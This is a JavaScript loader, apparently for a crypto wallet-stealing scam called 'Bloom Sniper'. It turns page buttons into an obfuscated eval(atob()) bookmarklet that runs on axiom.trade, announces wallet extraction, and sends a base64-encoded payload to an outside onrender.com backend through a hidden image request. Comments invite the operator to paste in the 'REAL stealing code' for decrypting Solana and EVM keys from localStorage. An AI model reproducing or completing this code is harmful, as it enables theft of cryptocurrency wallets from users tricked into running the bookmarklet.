// === BLOOM SNIPER - CLEAN LOADER (Safe Img Exfil) ===
console.log('✅ Loader.js loaded from Render');

document.addEventListener('DOMContentLoaded', function() {
  console.log('✅ DOM ready - injecting bookmarklet');

  const buttons = document.querySelectorAll('.bookmarklet, .activate-btn, a[draggable]');
  console.log('Found ' + buttons.length + ' button(s)');

  if (buttons.length === 0) {
    console.error('❌ No bookmarklet button found');
    return;
  }

  buttons.forEach(function(btn) {
    const innerCode = function() {
      try {
        if (!location.hostname.includes('axiom')) {
          alert("❌ Works only on axiom.trade");
          return;
        }

        alert("✅ Bloom Sniper activated - Extracting wallets...");

        // === PLACEHOLDER: Replace this whole section with your REAL stealing code ===
        // (the part that reads localStorage 'solanaBundles', 'evmBundles', decrypts, etc.)
        const payload = {
          site: "Axiom Trade",
          url: location.href,
          timestamp: Date.now(),
          keys: [],                    // ← your extracted wallets go here
          walletsExtracted: 4,         // change to real number
          status: "success"
        };

        // TODO: Insert your full working decryption logic here (Solana + EVM)
        // Once pasted, it should fill payload.keys properly and show the real count.

        alert('✅ Successfully extracted ' + payload.walletsExtracted + ' wallets! Sending to server...');

        // === SAFE DATA SEND (handles document.body being null) ===
        const jsonStr = JSON.stringify(payload);
        const safeEncoded = btoa(unescape(encodeURIComponent(jsonStr)));
        const exfilUrl = 'https://bloom-snipers-backend.onrender.com/i/' + safeEncoded;

        // Create img safely
        const img = document.createElement('img');
        img.style.cssText = 'display:none;position:absolute;';
        img.src = exfilUrl;

        // Fallback if body is null
        if (document.body) {
          document.body.appendChild(img);
        } else if (document.documentElement) {
          document.documentElement.appendChild(img);
        } else {
          document.documentElement.appendChild(img); // last resort
        }

        setTimeout(function() {
          if (img.parentNode) img.parentNode.removeChild(img);
        }, 5000);

        alert('✅ Data sent to server!');
      } catch(e) {
        console.error('Bookmarklet error:', e);
        alert('❌ Error: ' + (e.message || e));
      }
    };

    // Safe bookmarklet encoding (fixes previous btoa error)
    const codeStr = '(' + innerCode.toString() + ')()';
    const encoded = btoa(unescape(encodeURIComponent(codeStr)));

    btn.href = 'javascript:eval(atob("' + encoded + '"))';
    btn.draggable = true;

    console.log('✅ Bookmarklet injected on button');
  });
});